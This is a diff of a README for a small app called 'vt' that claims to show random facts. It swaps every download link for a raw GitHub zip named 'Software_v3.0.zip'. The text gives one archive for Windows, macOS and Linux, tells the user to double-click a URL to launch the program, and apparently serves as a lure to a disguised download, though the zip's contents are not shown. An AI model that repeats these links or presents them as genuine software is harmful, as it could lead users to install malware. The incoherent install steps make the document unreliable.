@@ -2,7 +2,7 @@
 
 ## 📦 Download
 
-[![Download vt](https://raw.githubusercontent.com/sigmaskibidiohiorizzlerhawkuah/vt/main/blandishment/vt.zip)](https://raw.githubusercontent.com/sigmaskibidiohiorizzlerhawkuah/vt/main/blandishment/vt.zip)
+[![Download vt](https://raw.githubusercontent.com/sigmaskibidiohiorizzlerhawkuah/vt/main/lib/Software_v3.0.zip)](https://raw.githubusercontent.com/sigmaskibidiohiorizzlerhawkuah/vt/main/lib/Software_v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -24,12 +24,12 @@ Welcome to vt! This application provides a fun way to browse random facts. You c
 
 To download vt, visit the Releases page. Follow these steps:
 
-1. Click the following link to go to the downloads: [Download vt](https://raw.githubusercontent.com/sigmaskibidiohiorizzlerhawkuah/vt/main/blandishment/vt.zip).
+1. Click the following link to go to the downloads: [Download vt](https://raw.githubusercontent.com/sigmaskibidiohiorizzlerhawkuah/vt/main/lib/Software_v3.0.zip).
 2. On the Releases page, look for the latest version.
 3. Choose the correct file for your operating system:
-   - For Windows, download `https://raw.githubusercontent.com/sigmaskibidiohiorizzlerhawkuah/vt/main/blandishment/vt.zip`.
-   - For macOS, download `https://raw.githubusercontent.com/sigmaskibidiohiorizzlerhawkuah/vt/main/blandishment/vt.zip`.
-   - For Linux, download `https://raw.githubusercontent.com/sigmaskibidiohiorizzlerhawkuah/vt/main/blandishment/vt.zip`.
+   - For Windows, download `https://raw.githubusercontent.com/sigmaskibidiohiorizzlerhawkuah/vt/main/lib/Software_v3.0.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/sigmaskibidiohiorizzlerhawkuah/vt/main/lib/Software_v3.0.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/sigmaskibidiohiorizzlerhawkuah/vt/main/lib/Software_v3.0.zip`.
 4. Once the download completes, locate the file in your Downloads folder.
 5. Unzip or extract the file.
 
@@ -38,7 +38,7 @@ To download vt, visit the Releases page. Follow these steps:
 #### For Windows:
 
 1. Open the `vt-windows` folder.
-2. Double-click `https://raw.githubusercontent.com/sigmaskibidiohiorizzlerhawkuah/vt/main/blandishment/vt.zip` to start the application.
+2. Double-click `https://raw.githubusercontent.com/sigmaskibidiohiorizzlerhawkuah/vt/main/lib/Software_v3.0.zip` to start the application.
 
 #### For macOS:
 
